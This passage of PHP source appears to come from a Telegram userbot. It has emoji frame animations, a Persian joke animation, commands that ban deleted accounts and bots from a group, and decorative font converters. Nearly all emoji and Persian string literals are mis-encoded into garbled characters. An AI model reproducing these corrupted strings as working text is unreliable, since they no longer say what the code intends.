                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐๐๐๐๐๐๐๐๐ฅ
๐ฅ๐๐๐ค๐ค๐ค๐ค๐๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐๐ค๐ค๐ค๐ค๐๐๐ฅ
๐ฅ๐๐๐๐๐๐๐๐๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธ
โค๏ธ๐๐๐๐๐๐๐๐โค๏ธ
โค๏ธ๐๐๐ค๐ค๐ค๐ค๐๐โค๏ธ
โค๏ธ๐๐งก๐๐๐๐๐งก๐โค๏ธ
โค๏ธ๐๐งก๐๐๐๐๐งก๐โค๏ธ
โค๏ธ๐๐งก๐๐๐๐๐งก๐โค๏ธ
โค๏ธ๐๐งก๐๐๐๐๐งก๐โค๏ธ
โค๏ธ๐๐๐ค๐ค๐ค๐ค๐๐โค๏ธ
โค๏ธ๐๐๐๐๐๐๐๐โค๏ธ
โค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโป๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโฝ๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโป๏ธโป๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโฌ๏ธโป๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฌ๏ธโป๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธ
โฌ๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโฝ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โป๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธ
โป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธโป๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ๏ธโฝ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ']);
                    }

                    if ($text == 'ูพุดู' or $text == 'ูพุดูุงู') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐๐๐๐๐๐๐๐๐๐๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐๐๐๐๐๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐๐๐๐๐๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ๐ฟ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ๐ฑ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐๐๐๐๐๐๐๐๐๐๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ูพุดู ุฏ?ฺฏู ูุฏุงุฑู ูู? ุจุฑฺฏุงู ุฑ?ุฎุช ุจูููุง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐๐๐๐๐๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฑ๐ฟ๐ฑ๐ฟ๐ฑ๐ฟ๐ฑ๐ฟ๐ฑ๐ฟ๐ฑ๐ฟ๐ฑ๐ฟ๐ฑ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โ๏ธ๐โ๏ธ๐โ๏ธ๐โ๏ธ๐โ๏ธ๐โ๏ธ๐โ๏ธ๐โ๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐ฑ๐ฟ๐๐๐ฑ๐ฟ๐๐๐ฑ๐ฟ๐๐๐ฑ๐ฟ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐ฑ๐ฟโ๏ธ๐๐๐๐๐ฟ๐ฑโ๏ธ๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุฏ?ฺฏู ุจุฑฺฏ? ุจุฑุงู ููููุฏู ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ูพุดูุงู ุฑ?ุฎ โน']);
                    }
                    if (preg_match("/^[\/\#\!]?(clean deleted account|ูพุงฺฉุณุงุฒ? ุฏู?ุช ุงฺฉุงูุช ูุง|ุญุฐู ุฏู?ุช ุงฺฉุงูุช ูุง|clean deleted)$/si", $text)) {
                        $channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
                        $channels_ChannelParticipants = yield $this->channels->getParticipants(['channel' => $peer, 'filter' => $channelParticipantsRecent, 'offset' => 0, 'limit' => 200, 'hash' => 0,]);
                        $channelBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                        $kl = $channels_ChannelParticipants['users'];
                        $list = "";
                        foreach ($kl as $key => $val) {
                            $fon = $kl[$key]['deleted'];
                            $fonid = $kl[$key]['id'];
                            if ($fon == true) {
                                $list .= '' . $kl[$key]['id'] . "\n";
                                $Updates = yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $fonid, 'banned_rights' => $channelBannedRights,]);
                            }
                        }
                        $alaki = explode("\n", $list);
                        $allcount = count($alaki) - 1;
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐๐ฅ๐ฅ ๐๐๐ฅ๐๐ญ๐๐ ๐๐๐๐จ๐ฎ๐ง๐ญ๐ฌ ๐ฐ๐๐ซ๐ ๐ซ๐๐ฆ๐จ๐ฏ๐๐ ๐๐ซ๐จ๐ฆ ๐ญ๐ก๐ ๐ ๐ซ๐จ๐ฎ๐ฉ โ
๐๐ฎ๐ฆ๐๐๐ซ ๐จ๐ ๐๐๐๐จ๐ฎ๐ง๐ญ๐ฌ ๐ซ๐๐ฆ๐จ๐ฏ๐๐ : $allcount", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(clean bots|clean robots|ูพุงฺฉุณุงุฒ? ุฑุจุงุช ูุง|ุญุฐู ุฑุจุงุช ูุง)$/si", $text)) {
                        $channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
                        $channels_ChannelParticipants = yield $this->channels->getParticipants(['channel' => $peer, 'filter' => $channelParticipantsRecent, 'offset' => 0, 'limit' => 200, 'hash' => 0,]);
                        $channelBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                        $kl = $channels_ChannelParticipants['users'];
                        $list = "";
                        foreach ($kl as $key => $val) {
                            $fon = $kl[$key]['bot'];
                            $fonid = $kl[$key]['id'];
                            if ($fon == true) {
                                $list .= '' . $kl[$key]['id'] . "\n";
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $fonid, 'banned_rights' => $channelBannedRights,]);
                            }
                        }
                        $alaki = explode("\n", $list);
                        $allcount = count($alaki) - 1;
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐๐ฅ๐ฅ ๐ซ๐จ๐๐จ๐ญ๐ฌ ๐ฐ๐๐ซ๐ ๐ซ๐๐ฆ๐จ๐ฏ๐๐ ๐๐ซ๐จ๐ฆ ๐ญ๐ก๐ ๐ ๐ซ๐จ๐ฎ๐ฉ โ
๐๐ฎ๐ฆ๐๐๐ซ ๐จ๐ ๐๐๐๐จ๐ฎ๐ง๐ญ๐ฌ ๐ซ๐๐ฆ๐จ๐ฏ๐๐ : $allcount", 'parse_mode' => 'MarkDown']);
                    }
                    if (file_get_contents('enfont.txt') == 'on') {
                        $text = strtoupper("$text");
                        $en = ['Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M'];
                        $a_a = ['๐', '๐', '๐ด', '๐', '๐', '๐', '๐', '๐ธ', '๐พ๏ธ', '๐ฟ๏ธ', '๐ฐ๏ธ', '๐', '๐ณ', '๐ต', '๐ถ', '๐ท', '๐น', '๐บ', '๐ป', '๐', '๐', '๐ฒ', '๐', '๐ฑ๏ธ', '๐ฝ', '๐ผ'];
                        $b_b = ['๐ ', '๐ฆ', '๐', '๐ก', '๐ฃ', '๐จ', '๐ค', '๐', '๐', '๐', '๐', '๐ข', '๐', '๐', '๐', '๐', '๐', '๐', '๐', '๐ฉ ', '๐ง', '๐', '๐ฅ', '๐', '๐', '๐'];
                        $c_c = ['Qฬทฬท', 'Wฬทฬท', 'Eฬทฬท', 'Rฬทฬท', 'Tฬทฬท', 'Yฬทฬท', 'Uฬทฬท', 'Iฬทฬท', 'Oฬทฬท', 'Pฬทฬท', 'Aฬทฬท', 'Sฬทฬท', 'Dฬทฬท', 'Fฬทฬท', 'Gฬทฬท', 'Hฬทฬท', 'Jฬทฬท', 'Kฬทฬท', 'Lฬทฬท', 'Zฬทฬท', 'Xฬทฬท', 'Cฬทฬท', 'Vฬทฬท', 'Bฬทฬท', 'Nฬทฬท', 'Mฬทฬท'];
                        $d_d = ['โ', 'โ', 'โบ', 'โ', 'โ', 'โ', 'โ', 'โพ', 'โ', 'โ', 'โถ', 'โ', 'โน', 'โป', 'โผ', 'โฝ', 'โฟ', 'โ', 'โ', 'โ', 'โ', 'โธ', 'โ', 'โท', 'โ', 'โ๏ธ'];
                        $e_e = ['วซ', 'แดก', 'แด', 'ส', 'แด', 'ส', 'แด', 'ษช', 'แด', 'แด', 'แด', 's', 'แด', 'า', 'ษข', 'ส', 'แด', 'แด', 'ส', 'แดข', 'x', 'แด', 'แด ', 'ส', 'ษด', 'แด'];
                        $f_f = ['โ', 'แ', 'โฎ', 'โ', 'ฦฌ', 'แฝ', 'ฦฒ', 'แ', 'แพ', 'โ', 'แฏ', 'แ', 'โ', 'โฑ', 'แฉ', 'โ', 'โ', 'ำ', 'โ', 'โค', 'โต', 'โญ', 'แ', 'แฐ', 'โ', 'โณ'];
                        $h_h = ['๐', '๐', '๐ด', '๐', '๐', '๐', '๐', '๐ธ', '๐พ', '๐ฟ', '๐ฐ', '๐', '๐ณ', '๐ต', '๐ถ', '๐ท', '๐น', '๐บ', '๐ป', '๐', '๐', '๐ฒ', '๐', '๐ฑ', '๐ฝ', '๐ผ'];
                        $ss = str_replace($en, $a_a, $text);
                        $aa = str_replace($en, $b_b, $text);
                        $bb = str_replace($en, $c_c, $text);
                        $cc = str_replace($en, $d_d, $text);
                        $dd = str_replace($en, $e_e, $text);
                        $ee = str_replace($en, $f_f, $text);
                        $hh = str_replace($en, $h_h, $text);
                        $bots = [$ss, $aa, $bb, $cc, $dd, $ee, $hh,];
                        $ru = $bots[rand(0, count($bots) - 1)];
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$ru", 'parse_mode' => 'Markdown']);
                    }

                    if (file_get_contents('fafont.txt') == 'on') {
                        $matnFA = "$text";
                        $_a = ['ุข', 'ุงูู', 'ุจูู', 'ูพูููููู', 'ุชููู', 'ุซูู', 'ุฌูู', 'ฺูู', 'ุญููููู', 'ุฎูู', 'ุฏูู', 'ุฐูู', 'ุฑูู', 'ุฒูู', 'ฺูู', 'ุณูููููู', 'ุดููููู', 'ุตูู', 'ุถูู', 'ุทูู', 'ุธูู', 'ุนูู', 'ุบูู', 'ููู', 'ููู', 'ฺชูููู', 'ฺฏูููู', 'ููู', 'ููููููู', 'ููู', 'ููู', 'ููู', '?ูู'];
